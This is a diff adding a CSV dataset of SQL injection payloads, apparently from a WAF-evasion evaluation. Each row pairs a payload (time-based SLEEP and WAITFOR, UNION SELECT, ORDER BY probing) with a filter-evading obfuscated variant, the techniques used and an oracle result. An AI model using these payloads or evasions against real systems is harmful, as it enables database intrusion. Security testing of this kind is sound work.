@@ -1,0 +1,88 @@
+label,payload,obf_payload,techniques,unchanged,oracle
+sqli,or pg_SLEEP(5)--,or%252520pg_SLEEP%2525285%252529--,double_url_encode+url_encode+unicode_substitution,False,invalid
+sqli,ORDER BY 3,ORDER%2520BY%25203,case_toggle+double_url_encode+comment_insertion,False,invalid
+sqli,"benchmark(10000000,MD5(1))#",benchmark%252810000000%2CMD5%281%2529%29%2523,url_encode+partial_url_encode+comment_insertion,False,invalid
+sqli,"benchmark(50000000,MD5(1))#","benchmark(50000000,MD5%281\u0029\u0029#",unicode_substitution+case_toggle+whitespace,False,invalid
+sqli,ORDER BY 20,ORDER%20BY%2020,unicode_substitution+fallback_full_url_encode,False,invalid
+sqli,'));waitfor delay '0:0:5'--,%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,url_encode+case_toggle,False,error
+sqli,\,%5C,whitespace+fallback_full_url_encode,False,invalid
+sqli,ORDER BY 24,ORDER%252520BY%25252024,double_url_encode+whitespace+url_encode,False,invalid
+sqli,WHERE 1=1 AND 1=1,WHERE%201%3D1 AND%201%3D1,partial_url_encode,False,invalid
+sqli,AS INJECTX WHERE 1=1 AND 1=1--,AS%252520INJECTX%252520wHere%2525201%25253D1%252520And%2525201%25253D1--,case_toggle+double_url_encode+url_encode,False,invalid
+sqli,%' AND 8310=8310 AND '%'=',%252525%252526%25252339%25253B%252520AND%2525208310%25253D8310%252520AND%252520%25255Cu0027%252525%25255Cu0027%25253D%252527,unicode_substitution+double_url_encode+url_encode,False,invalid
+sqli,OR x=y--,Or%250Ax%253Dy--,case_toggle+whitespace+double_url_encode,False,invalid
+sqli,ORDER BY 31337,ORDER%252520BY%25252031337,double_url_encode+url_encode,False,invalid
+sqli,AND 1,AND%201,partial_url_encode+comment_insertion+fallback_full_url_encode,False,invalid
+sqli,ORDER BY 21,ORDER%252520BY%25252021,comment_insertion+url_encode+double_url_encode,False,invalid
+sqli,ORDER BY 7,ORDER%20BY%207,url_encode+comment_insertion,False,invalid
+sqli,ORDER BY 2,ORDER%25250aBY%250A2,whitespace+partial_url_encode+double_url_encode,False,invalid
+sqli,ORDER BY 4,"ORDER%250aBY
+4",whitespace+partial_url_encode,False,invalid
+sqli,ORDER BY 12,ORDER%20BY%2012,url_encode,False,invalid
+sqli,ORDER BY 9,ORDER%20BY%209,url_encode,False,invalid
+sqli,AND 7300=7300 AND ('pKlZ'='pKlZ,AND%25207300%253D7300%2520AND%2520%2528%2527pKlZ%2527%253D%2527pKlZ,double_url_encode,False,error
+sqli,"-1 UNION SELECT 1 INTO @,@",-1%252520UNION%2520SELECT%2525201%2520INTO%2520%2540%25252C%2540,partial_url_encode+unicode_substitution+double_url_encode,False,invalid
+sqli,ORDER BY 6,ORDER%2520BY%25206,double_url_encode+unicode_substitution,False,invalid
+sqli,ORDER BY 11,ORDER/**/BY	11,whitespace,False,invalid
+sqli,AND 7300=7300 AND 'pKlZ'='pKlZ,AND%25207300%253D7300%2520AND%2520%2527pKlZ%2527%253D%2527pKlZ,double_url_encode+comment_insertion,False,error
+sqli,ORDER BY 25,ORDER%20BY%2025,case_toggle+fallback_full_url_encode,False,invalid
+sqli,ORDER BY 5,ORDER/**/BY%0a5,whitespace,False,invalid
+sqli,OR 1=1--,OR%091=1--,whitespace+comment_insertion+unicode_substitution,False,invalid
+sqli,/,%252F,double_url_encode+whitespace+unicode_substitution,False,invalid
+sqli,&&SLEEP(5),%26%26SLEEP%285%29,comment_insertion+fallback_full_url_encode,False,invalid
+sqli,' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,%2527%2520and%25201%2520in%252520%2528select%2520min%2528name%2529%2520from%2520sysobjects%2520where%2520xtype%252520%25253D%252520%252527U%252527%2520and%252520name%2520%253E%252520%2527.%2527%252529%2520--,partial_url_encode+double_url_encode,False,error
+sqli,ORDER BY 26,ORDER%20BY%2026,case_toggle+partial_url_encode+unicode_substitution+fallback_full_url_encode,False,invalid
+sqli,ORDER BY 8,ORDER%20BY%208,partial_url_encode+comment_insertion+case_toggle,False,invalid
+sqli,ORDER BY 13,ORDER%20BY%2013,url_encode+whitespace,False,invalid
+sqli,AND true,AND%2520true,double_url_encode+whitespace,False,invalid
+sqli,';waitfor delay '0:0:5'--,%27%3Bwaitfor%0Adelay%2F%2A%2A%2F%270%3A0%3A5%27--,whitespace+url_encode,False,uncertain
+sqli,IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,IF%287423=7423%29 SELECT 7423 ELSE DROP FUNCTION xcjl--,unicode_substitution,False,invalid
+sqli,ORDER BY 28,ORDER%20BY%2028,comment_insertion+fallback_full_url_encode,False,invalid
+sqli,ORDER BY SLEEP(5)#,ORDER%252509BY%25250aSLEEP%25285%2529%2523,whitespace+double_url_encode+case_toggle,False,invalid
+sqli,"' or """,%27%20or%20%22,partial_url_encode+fallback_full_url_encode,False,error
+sqli,');waitfor delay '0:0:5'--,%2527%2529%253Bwaitfor%2520delay%2520%25270%253A0%253A5%2527--,double_url_encode,False,error
+sqli,ORDER BY 22,ORDER%0aBY	22,unicode_substitution+whitespace,False,invalid
+sqli,ORDER BY 19,ORDER%250aBY/%2A%2A/19,whitespace+case_toggle+partial_url_encode,False,invalid
+sqli,""" OR """" = """,""" or """" = """,case_toggle,False,invalid
+sqli,1 or sleep(5)#,1%2520or%252520sleep%2525285%252529%2523,double_url_encode+partial_url_encode+case_toggle,False,invalid
+sqli,HAVING 1=1#,HAVING%201=1%23,partial_url_encode+case_toggle+whitespace,False,invalid
+sqli,"1' ORDER BY 1,2--+",1%252527%252520ORDER%252520BY%2525201%25252C2--%25252B,case_toggle+url_encode+double_url_encode,False,invalid
+sqli,ORDER BY 17,ORDER	BY	17,whitespace+partial_url_encode+case_toggle,False,invalid
+sqli,RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',RLIKE%2520%252528SELECT%2520%2528CASE%2520WHEN%252520%2525284346%25253D4346%252529%2520THEN%25200x61646d696e%2520ELSE%25200x28%2520END%2529%2529%252520AND%2520%252527Txws%2527%253D%252527,double_url_encode+unicode_substitution+partial_url_encode,False,error
+sqli,WHERE 1=1 AND 1=0,WHERE%25201%3D1%20AND%201%3D0,url_encode+unicode_substitution+partial_url_encode,False,invalid
+sqli,"1' GROUP BY 1,2,--+","1%27 GROUP%20BY%201,2%2C--%2B",partial_url_encode,False,error
+sqli,AND 0,anD%25200,case_toggle+comment_insertion+double_url_encode,False,invalid
+sqli,ORDER BY 27,ORDER%09BY/**/27,whitespace+unicode_substitution+comment_insertion,False,invalid
+sqli,ORDER BY 23,"ORDER	BY
+23",whitespace,False,invalid
+sqli,"benchmark(50000000,MD5(1))","benchmark(50000000,MD5(1%29%29",case_toggle+partial_url_encode+whitespace,False,invalid
+sqli,OR x=x#,OR%20x%3Dx%23,comment_insertion+fallback_full_url_encode,False,invalid
+sqli,',%27,comment_insertion+fallback_full_url_encode,False,error
+sqli,ORDER BY 10,ORDER%0aBY%0910,case_toggle+whitespace,False,invalid
+sqli,RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',RLIKE (SELE/**/CT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AnD 'Txws'=',comment_insertion+case_toggle,False,error
+sqli,OR 1=0--,OR%2525201%25253D0--,url_encode+double_url_encode,False,invalid
+sqli,"or benchmark(50000000,MD5(1))#",or%20benchmark%2850000000%2CMD5%281%29%29%23,url_encode,False,invalid
+sqli,AS INJECTX WHERE 1=1 AND 1=0--,AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0--,url_encode+comment_insertion,False,invalid
+sqli,"or benchmark(50000000,MD5(1))--",or%250Abenchmark%252850000000%252CMD5%25281%2529%2529--,whitespace+double_url_encode,False,invalid
+sqli,HAVING 1=0#,HAVING%201%3D0#,partial_url_encode+comment_insertion+unicode_substitution,False,invalid
+sqli,"1 or benchmark(10000000,MD5(1))#",1%2520Or%2520benchmark%252810000000%252CMD5%25281%2529%2529%2523,case_toggle+double_url_encode,False,invalid
+sqli,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,AND%20(SELECT%20* FROM%20%28SELECT(SLEEP(5%29%29%29nQIP)--,partial_url_encode,False,invalid
+sqli,ORDER BY 1,ORDER%20BY%201,url_encode+case_toggle,False,invalid
+sqli,waitfor delay '00:00:05'--,waitfor%20delay%20%2700%3A00%3A05%27--,case_toggle+comment_insertion+fallback_full_url_encode,False,error
+sqli,ORDER BY 16,ORDER%20BY%2016,url_encode,False,invalid
+sqli,IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,IF%25287423%253D7424%2529%2520SELECT%25207423%2520ELSE%2520DROP%2520FUNCTION%2520xcjl--,double_url_encode+unicode_substitution,False,invalid
+sqli,')) or pg_sleep(5)--,%27%29%29%20or pg_sleep%285%29--,partial_url_encode,False,error
+sqli,AND 7300=7300 AND ('pKlZ'='pKlY,AND%2525207300%25253D7300%252520AND%252520%252528%252527pKlZ%252527%25253D%252527pKlY,url_encode+double_url_encode+comment_insertion,False,error
+sqli,' or pg_sleep(5)--,'	or%0apg_sleep%285\u0029--,whitespace+unicode_substitution,False,error
+sqli,ORDER BY 30,ORDER%2520BY%252030,double_url_encode+comment_insertion,False,invalid
+sqli,';WAITFOR DELAY '0:0:30'--,%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27--,url_encode+comment_insertion+case_toggle,False,uncertain
+sqli,ORDER BY 14,ORDER%20BY%2014,case_toggle+unicode_substitution+comment_insertion+fallback_full_url_encode,False,invalid
+sqli,ORDER BY 18,ORDER%2520BY%252018,double_url_encode+case_toggle+whitespace,False,invalid
+sqli,' UNION SELECT sum(columnname ) from tablename --,'/*%2A/UNI/*!50000*/ON%250aSELECT	sum(columnname%09%29	from	tablename%0A--,whitespace+partial_url_encode+comment_insertion,False,error
+sqli,-- or #,--%20or%20%2523,partial_url_encode+url_encode+case_toggle,False,invalid
+sqli,""" OR 1 = 1 -- -",%2522%2520OR%25201%2520%253D%25201%2520--%2520-,double_url_encode+whitespace,False,invalid
+sqli,ORDER BY 29,ORDER%20BY%0929,partial_url_encode+whitespace,False,invalid
+sqli,));waitfor delay '0:0:5'--,"));waitfor
+delay/**/'0:0:5'--",whitespace,False,error
+sqli,%' AND 8310=8311 AND '%'=',%&#39; AND 8310=8311 AND &#39;%\u0027=',comment_insertion+unicode_substitution,False,invalid
+sqli,ORDER BY 15,ORDER%20BY%2015,unicode_substitution+fallback_full_url_encode,False,invalid
